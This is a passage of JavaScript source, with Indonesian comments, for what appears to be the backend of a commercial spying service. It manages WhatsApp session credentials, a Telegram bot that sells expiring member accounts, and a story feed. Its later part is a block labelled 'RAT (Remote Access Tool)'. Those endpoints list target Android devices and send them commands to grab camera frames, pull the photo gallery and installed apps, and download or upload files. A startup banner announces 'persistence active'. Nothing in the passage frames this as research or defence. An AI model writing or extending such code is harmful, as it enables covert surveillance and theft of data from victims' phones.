      console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
    }

    try {
      console.log(`[START] Connecting VIP: ${sessionName}`);
      await connectSession(vipDir, sessionName);
    } catch (err) {
      console.error(`[ERROR] VIP ${sessionName}:`, err.message);
    }
  }
}
await sleep(20000);*/
  // 2. Scan User Folders (Logika Anda yang disederhanakan)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); // Filter hanya folder saja

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        // ✅ Cek apakah session sudah aktif
        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
            
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
    
}
function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error preparing VIP folders:", err.message);
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}
function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}
   function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
} 

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
const CHANNEL_USERNAME = "@zixter88"; // ganti dengan channel kamu

bot?.onText(/^\/?setaccountgroup$/, async (msg) => {
  const id = msg.from.id;
  const cfg = loadTelegramConfig();
  if (!cfg.ownerList.includes(id)) return bot.sendMessage(msg.chat.id, '❌ Hanya owner yang boleh mengatur grup notifikasi.');
  if (msg.chat.type === 'private') return bot.sendMessage(msg.chat.id, '⚠️ Jalankan /setaccountgroup langsung di grup tujuan.');
  cfg.accountNotificationGroupId = String(msg.chat.id);
  fs.writeFileSync(telegramDataPath, JSON.stringify(cfg, null, 2));
  return bot.sendMessage(msg.chat.id, '✅ Grup ini sekarang menjadi grup notifikasi pembuatan akun.');
});

bot.onText(/^\/?(start|menu)/, async (msg) => {
  const id = msg.from.id;

  // CEK JOIN CHANNEL
  try {
    const member = await bot.getChatMember(CHANNEL_USERNAME, id);

    if (!["member", "administrator", "creator"].includes(member.status)) {
      const joinUrl = `https://t.me/${CHANNEL_USERNAME.replace("@", "")}`;

      return bot.sendMessage(
        id,
        `🔒 *AKSES DIBATASI*\n\nUNTUK MENGGUNAKAN BOT INI, KAMU HARUS JOIN CHANNEL KAMI DULU.\n\nSETELAH JOIN, SILAKAN KIRIM /start LAGI.`,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "JOIN CHANNEL",
                  url: joinUrl
                }
              ]
            ]
          }
        }
      );
    }
  } catch (e) {
    console.error(e);
    return bot.sendMessage(
      id,
      "⚠️ Bot harus menjadi admin di channel agar bisa memverifikasi member."
    );
  }

  // ==========================
  // KODE KAMU (TIDAK DIUBAH)
  // ==========================
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "BUAT AKUN MEMBER", callback_data: "create_member", style: "primary" }],
        [{ text: "SET EXPIRED", callback_data: "set_expire", style: "success" }],
        ...(isOwner ? [[
          { text: "LIST USER", callback_data: "list_user", style: "primary" },
          { text: "BUAT CUSTOM USER", callback_data: "create_custom", style: "success" },
          { text: "HAPUS USER", callback_data: "delete_user", style: "danger" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", async msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        const newUser = { 
          username, 
          password, 
          role: "member", 
          expiredDate: expired.toISOString().split("T")[0],
          uid: crypto.randomBytes(16).toString('hex'),  // ✅ TAMBAHKAN INI
          createdBy: id.toString(),
          createdAt: new Date().toISOString()
        };
        db.push(newUser);
        saveDatabase(db);
        await notifyAccountCreated({ username, role: 'member', expiredDate: newUser.expiredDate, durationDays: parseInt(day, 10), createdBy: id.toString(), source: 'Telegram Bot' });
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}
🆔 UID: ${newUser.uid}`);  // ✅ TAMBAHKAN INI
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", async msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukan:\n`usernamebebas|passwordbebas|role|durasi`\n`Contoh : tes|1|owner|300`\n`Role : member, reseller, vip, admin, owner`", { parse_mode: "Markdown" });
      bot.once("message", async msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        const newUser = { 
          username, 
          password, 
          role, 
          expiredDate: expired.toISOString().split("T")[0],
          uid: crypto.randomBytes(16).toString('hex'),  // ✅ TAMBAHKAN INI
          createdBy: id.toString(),
          createdAt: new Date().toISOString()
        };
        db.push(newUser);
        saveDatabase(db);
        await notifyAccountCreated({ username, role, expiredDate: newUser.expiredDate, durationDays: parseInt(day, 10), createdBy: id.toString(), source: 'Telegram Bot' });
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}
🆔 UID: ${newUser.uid}`);  // ✅ TAMBAHKAN INI
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", async msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(() => {
    const targetChatId = "-1003248075546"; 
    bot.sendMessage(targetChatId, "✅ [SERVER] *SERVICES ONLINE*\n\nSystem Status: *RUNNING*\nUptime: Just started\n✅ All systems operational.", { parse_mode: "Markdown" });
  }, 3000);

function scheduleAutoClean() {
  const now = new Date();

  // 00:00 WIB = 17:00 UTC
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  // kalau sudah lewat, jadwalkan besok
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();

    // ulangi setiap hari tepat jam yang sama
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

// ========== TAMBAHKAN INI DI ATAS APP.LISTEN ==========
app.use(cors()); 
app.use(bodyParser.json({ limit: '500mb' }));

// ============================================================
// STORY API - 24 JAM
// Dipakai oleh story_page.dart: getStories, uploadStory,
// deleteStory, viewStory, likeStory.
// ============================================================
const STORIES_FILE = path.join(__dirname, 'stories.json');
const STORIES_DIR = path.join(__dirname, 'story_uploads');
if (!fs.existsSync(STORIES_DIR)) fs.mkdirSync(STORIES_DIR, { recursive: true });

function loadStories() {
  try {
    const data = JSON.parse(fs.readFileSync(STORIES_FILE, 'utf8'));
    return Array.isArray(data) ? data : [];
  } catch (_) { return []; }
}
function saveStories(stories) {
  fs.writeFileSync(STORIES_FILE, JSON.stringify(stories, null, 2), 'utf8');
}
function storyUserFromKey(key) {
  if (!key) return null;
  const info = activeKeys[key];
  if (!info) return null;
  if (info.expires && Date.now() > info.expires) {
    delete activeKeys[key];
    return null;
  }
  return info.username;
}
function storyResponse(item, viewer) {
  return {
    story_id: item.story_id,
    username: item.username,
    media_url: item.media_url,
    media_type: item.media_type,
    caption: item.caption || '',
    like_count: Array.isArray(item.likes) ? item.likes.length : 0,
    view_count: Array.isArray(item.views) ? item.views.length : 0,
    is_liked: Array.isArray(item.likes) && item.likes.includes(viewer),
    is_owner: item.username === viewer,
    created_at: item.created_at,
  };
}
function purgeExpiredStories() {
  const stories = loadStories();
  const now = Date.now();
  const fresh = stories.filter(s => now - new Date(s.created_at).getTime() < 24 * 60 * 60 * 1000);
  if (fresh.length !== stories.length) {
    const freshIds = new Set(fresh.map(s => s.story_id));
    for (const old of stories.filter(s => !freshIds.has(s.story_id))) {
      if (old.filename) {
        try { fs.unlinkSync(path.join(STORIES_DIR, old.filename)); } catch (_) {}
      }
    }
    saveStories(fresh);
  }
  return fresh;
}

const storyStorage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, STORIES_DIR),
  filename: (_req, file, cb) => {
    const ext = path.extname(file.originalname || '').toLowerCase() || '.bin';
    cb(null, `${Date.now()}-${crypto.randomBytes(8).toString('hex')}${ext}`);
  }
});
const storyUpload = multer({
  storage: storyStorage,
  limits: { fileSize: 100 * 1024 * 1024 },
  fileFilter: (_req, file, cb) => {
    const ok = /^(image|video)\/(jpeg|jpg|png|webp|gif|mp4|quicktime|webm|x-matroska)$/.test(file.mimetype);
    cb(ok ? null : new Error('Format media tidak didukung'), ok);
  }
});

app.use('/story_uploads', express.static(STORIES_DIR, { maxAge: '1d' }));

app.get('/getStories', (req, res) => {
  const username = storyUserFromKey(req.query.key);
  if (!username) return res.status(401).json({ valid: false, message: 'Invalid session key' });
  const stories = purgeExpiredStories();
  return res.json({ valid: true, stories: stories
    .sort((a, b) => new Date(a.created_at) - new Date(b.created_at))
    .map(s => storyResponse(s, username)) });
});

app.post('/uploadStory', storyUpload.single('media'), (req, res) => {
  const username = storyUserFromKey(req.body?.key);
  if (!username) {
    if (req.file) try { fs.unlinkSync(req.file.path); } catch (_) {}
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!req.file) return res.status(400).json({ valid: false, message: 'Media wajib diupload' });

  const type = req.body.media_type === 'video' ? 'video' : 'image';
  const stories = purgeExpiredStories();
  const item = {
    story_id: crypto.randomBytes(12).toString('hex'),
    username,
    filename: req.file.filename,
    media_url: `${req.protocol}://${req.get('host')}/story_uploads/${encodeURIComponent(req.file.filename)}`,
    media_type: type,
    caption: sanitize(req.body.caption || '').slice(0, 500),
    likes: [],
    views: [],
    created_at: new Date().toISOString(),
  };
  stories.push(item);
  saveStories(stories);
  return res.json({ valid: true, story: storyResponse(item, username) });
});

app.post('/deleteStory', (req, res) => {
  const username = storyUserFromKey(req.body?.key);
  if (!username) return res.status(401).json({ valid: false, message: 'Invalid session key' });
  const stories = purgeExpiredStories();
  const index = stories.findIndex(s => s.story_id === String(req.body.story_id) && s.username === username);
  if (index < 0) return res.status(404).json({ valid: false, message: 'Story tidak ditemukan' });
  const [removed] = stories.splice(index, 1);
  saveStories(stories);
  if (removed.filename) try { fs.unlinkSync(path.join(STORIES_DIR, removed.filename)); } catch (_) {}
  return res.json({ valid: true });
});

app.post('/viewStory', (req, res) => {
  const username = storyUserFromKey(req.body?.key);
  if (!username) return res.status(401).json({ valid: false, message: 'Invalid session key' });
  const stories = purgeExpiredStories();
  const story = stories.find(s => s.story_id === String(req.body.story_id));
  if (!story) return res.status(404).json({ valid: false, message: 'Story tidak ditemukan' });
  if (!Array.isArray(story.views)) story.views = [];
  if (!story.views.includes(username)) story.views.push(username);
  saveStories(stories);
  return res.json({ valid: true, view_count: story.views.length });
});

app.post('/likeStory', (req, res) => {
  const username = storyUserFromKey(req.body?.key);
  if (!username) return res.status(401).json({ valid: false, message: 'Invalid session key' });
  const stories = purgeExpiredStories();
  const story = stories.find(s => s.story_id === String(req.body.story_id));
  if (!story) return res.status(404).json({ valid: false, message: 'Story tidak ditemukan' });
  if (!Array.isArray(story.likes)) story.likes = [];
  const idx = story.likes.indexOf(username);
  if (idx >= 0) story.likes.splice(idx, 1);
  else story.likes.push(username);
  saveStories(stories);
  return res.json({ valid: true, is_liked: idx < 0, like_count: story.likes.length });
});

 

// ============================================================
// ENDPOINT RAT (Remote Access Tool)
// ============================================================
app.get('/api/list-targets', requireAuth, (req, res) => {
  const list = Object.entries(devices)
    .filter(([id, d]) => d.uid === req.uid) 
    .map(([id, d]) => ({
      id: d.id,
      model: d.model || d.name || 'Unknown',
      name: d.name || d.model || 'Unknown',
      ip: d.ip || '0.0.0.0',
      battery: d.battery || 0,
      status: d.status || 'Offline',
      lastSeen: d.lastSeen || new Date().toISOString(),
      release: d.androidVersion || 'Unknown'
    }));
  res.json(list);
});

// ─── RAT: Send command (LEGACY - pakai deviceId di URL) ──
app.post('/api/command/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { command, value } = req.body;
  
  // Cari device berdasarkan ID dan UID
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) {
    return res.status(403).json({ error: 'Device not found or unauthorized' });
  }

  // ─── LOG UNTUK DEBUG (Tambahan) ───
  console.log(`[SERVER] Command diterima: ${command} untuk device ${deviceId}`);

  // ─── KIRIM COMMAND VIA SOCKET KE DEVICE ───
  io.to(`device:${deviceId}`).emit('command', { command, value: value || '' });
  
  // ─── KHUSUS CAMERA: TUNGGU FRAME ───
  if (command === 'camera' || command === 'liveCamera') {
    // Hapus frame lama
    delete cameraFrames[deviceId];
    
    let attempts = 0;
    const maxAttempts = 10; // 10 x 500ms = 5 detik
    let frameReceived = false;
    
    const checkInterval = setInterval(() => {
      attempts++;
      const frame = cameraFrames[deviceId];
      
      if (frame) {
        clearInterval(checkInterval);
        frameReceived = true;
        console.log(`📸 Frame received for ${deviceId}, responding...`);
        res.json({ ok: true, command, deviceId, frame });
      } else if (attempts >= maxAttempts) {
        clearInterval(checkInterval);
        if (!frameReceived) {
          console.log(`⏰ Timeout waiting for camera frame from ${deviceId}`);
          res.status(408).json({ error: 'Timeout waiting for camera frame' });
        }
      }
    }, 500);
    return;
  }
  
  // ─── TAMBAHKAN INI: KHUSUS GET INSTALLED APPS ───
  if (command === 'getInstalledApps') {
    console.log(`📱 [SERVER] Perintah getInstalledApps diteruskan ke device ${deviceId}`);
    // Sudah dikirim via socket di atas. Kita langsung kirim respon OK ke Flutter.
    return res.json({ ok: true, command, deviceId });
  }

  // ─── RESPONSE BIASA UNTUK COMMAND LAIN ───
  res.json({ ok: true, command, deviceId });
});

// ── RAT: Get response ──
app.get('/api/get-response/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Unauthorized' });

  const data = target[1].lastResponse || {};
  res.json({ data });
});

// ── RAT: Download file ──
app.post('/api/download-file', requireAuth, (req, res) => {
  const { deviceId, path: filePath } = req.body;
  if (!deviceId || !filePath) return res.status(400).json({ error: 'Missing params' });

  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Unauthorized' });

  const reqId = crypto.randomBytes(8).toString('hex');
  io.to(`device:${deviceId}`).emit('command', {
    command: 'downloadFile',
    value: JSON.stringify({ path: filePath, reqId })
  });

  // Simulasi response (sebenarnya dari socket)
  setTimeout(() => {
    res.json({
      status: 'success',
      content: 'base64_encoded_file_content_here',
      name: filePath.split('/').pop()
    });
  }, 2000);
});

// ── RAT: Upload file ──
app.post('/api/upload-file', requireAuth, (req, res) => {
  const { deviceId, path, content } = req.body;
  if (!deviceId || !path || !content) return res.status(400).json({ error: 'Missing params' });

  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Unauthorized' });

  io.to(`device:${deviceId}`).emit('command', {
    command: 'uploadFile',
    value: JSON.stringify({ path, content })
  });
  res.json({ status: 'success' });
});

// ── GET produk APK ──
app.get('/produk/:filename', (req, res) => {
  const filepath = path.join(__dirname, 'produk', req.params.filename);
  if (!fs.existsSync(filepath)) return res.status(404).send('File not found');
  res.sendFile(filepath);
});

// ── Request screenshot (kirim command ke device, lalu ambil frame) ──
app.post('/api/request-screenshot/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { facing } = req.body; // "front" atau "back"

  // Cari device
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) {
    return res.status(403).json({ error: 'Device not found or unauthorized' });
  }

  // Kirim command camera dengan facing
  io.to(`device:${deviceId}`).emit('command', {
    command: 'camera',
    value: facing || 'front'
  });

  // Tunggu 2 detik agar device kirim frame
  setTimeout(() => {
    const frame = cameraFrames[deviceId];
    if (frame) {
      res.json({ ok: true, frame });
    } else {
      res.status(404).json({ error: 'No frame received within timeout' });
    }
  }, 3000);
});

// ── RAT: Ambil frame kamera terakhir (screenshot) ──
app.get('/api/screenshot/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Unauthorized' });

  const frame = cameraFrames[deviceId];
  if (!frame) {
    // Coba request screenshot langsung
    io.to(`device:${deviceId}`).emit('command', {
      command: 'camera',
      value: 'front'
    });
    // Tunggu 2 detik
    setTimeout(() => {
      const retryFrame = cameraFrames[deviceId];
      if (retryFrame) {
        res.json({ ok: true, frame: retryFrame });
      } else {
        res.status(404).json({ error: 'No frame available' });
      }
    }, 2500);
    return;
  }

  res.json({ ok: true, frame });
});

// ─── LIVE CAMERA VIA REST (POLLING) ──────────────────────────────
app.get('/api/live-camera/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { facing } = req.query; // 'front' atau 'back'
  
  // Cari device
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) {
    return res.status(403).json({ error: 'Device not found or unauthorized' });
  }

  // Kirim command camera ke device
  io.to(`device:${deviceId}`).emit('command', {
    command: 'camera',
    value: facing || 'front'
  });

  // Tunggu 2 detik untuk mendapatkan frame
  setTimeout(() => {
    const frame = cameraFrames[deviceId];
    if (frame) {
      res.json({ ok: true, frame });
    } else {
      res.status(404).json({ error: 'No frame received within timeout' });
    }
  }, 2000);
});

// ─── GET GALLERY VIA HTTP (FALLBACK) ──────────────────────────────
app.get('/api/gallery/:deviceId', requireAuth, (req, res) => {
    const { deviceId } = req.params;
    
    const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
    if (!target) {
        return res.status(403).json({ error: 'Device not found or unauthorized' });
    }

    // Kirim command ke device via socket
    io.to(`device:${deviceId}`).emit('command', {
        command: 'getGallery',
        value: ''
    });

    // Listener untuk response
    let galleryData = null;
    const galleryListener = (data) => {
        if (data.deviceId === deviceId) {
            galleryData = data;
        }
    };
    io.on('device:gallery', galleryListener);

    // Timeout 5 detik
    setTimeout(() => {
        io.off('device:gallery', galleryListener);
        if (galleryData) {
            res.json({ photos: galleryData.photos || [] });
        } else {
            res.status(408).json({ error: 'Timeout waiting for gallery' });
        }
    }, 5000);
});

console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
console.log(`    ZIXTER NIGHT - LIMIT EDITION   `);
console.log(`    STATUS : PERSISTENCE ACTIVE        `);
console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
// Keep upload failures explicit and JSON-formatted. Do not interfere with call/VC routes.
app.use((err, req, res, next) => {
  if (err && err.code === 'LIMIT_FILE_SIZE') {
    return res.status(413).json({ valid:false, message:'Media terlalu besar (maksimal 150 MB)' });
  }
  if (err && (err.name === 'MulterError' || /media|upload|file/i.test(String(err.message || '')))) {
    return res.status(400).json({ valid:false, message:String(err.message || 'Upload media gagal') });
  }
  return next(err);
});

